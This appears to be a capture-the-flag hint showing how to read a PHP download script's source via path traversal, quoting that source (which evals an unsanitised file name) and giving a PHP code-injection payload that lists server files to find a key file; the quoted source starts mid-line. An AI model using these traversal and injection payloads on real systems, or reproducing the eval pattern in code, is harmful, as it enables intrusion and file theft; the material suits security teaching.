You can read download.php source from itself:
<pre>
.../download.php?file=readme.txt/../download.php
</pre>
Source:
<pre>
 50)
        exit("Имя файла слишком длинное.");
    
    $fileName = basename($file);
        
    if (strpos($file, "readme") === false) {
        exit("Это неправильный путь, можно скачивать только файлы, в именах которых есть «readme».");
    }
    
    echo 'Содержимое файла '.$file.':';
    echo "
";
    readfile($file);
    echo "
";

    eval("fwrite(fopen('stats/stats.txt', 'a'), \"$fileName\n\");");
?>
</pre>
Do you see php injection too?
<pre>
.../download.php?filereadme"); var_dump(glob("*")); eval("
</pre>
Hint: the .key file is a .txt file too ;)<br>
GL